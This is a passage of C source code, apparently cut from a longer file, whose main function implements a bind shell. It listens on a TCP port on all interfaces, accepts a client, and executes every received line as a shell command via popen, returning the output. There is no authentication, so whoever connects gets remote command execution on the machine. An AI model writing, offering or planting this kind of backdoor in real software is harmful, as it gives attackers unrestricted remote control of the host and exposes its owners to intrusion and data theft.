int main() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len;
    char buffer[BUFFER_SIZE];
    char output[BUFFER_SIZE * 2];

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        exit(1);
    }

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        exit(1);
    }

    if (listen(server_fd, 1) < 0) {
        perror("listen");
        exit(1);
    }

    printf("Server listening on port %d\n", PORT);

    client_len = sizeof(client_addr);
    client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
    if (client_fd < 0) {
        perror("accept");
        exit(1);
    }

    printf("Client connected\n");

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        ssize_t bytes_read = read(client_fd, buffer, BUFFER_SIZE - 1);

        if (bytes_read <= 0) {
            printf("Client disconnected\n");
            break;
        }

        buffer[strcspn(buffer, "\r\n")] = 0;
        printf("Command: %s\n", buffer);

        if (strcmp(buffer, "quit") == 0 || strcmp(buffer, "exit") == 0) {
            send(client_fd, "Goodbye\n", 8, 0);
            break;
        }

        FILE* pipe = popen(buffer, "r");
        if (pipe) {
            memset(output, 0, sizeof(output));
            size_t total = 0;
            while (fgets(output + total, sizeof(output) - total, pipe) && total < sizeof(output) - 1) {
                total = strlen(output);
            }
            pclose(pipe);
            send(client_fd, output, strlen(output), 0);
        } else {
            send(client_fd, "Failed to execute command\n", 26, 0);
        }
    }

    close(client_fd);
    close(server_fd);
    return 0;
}
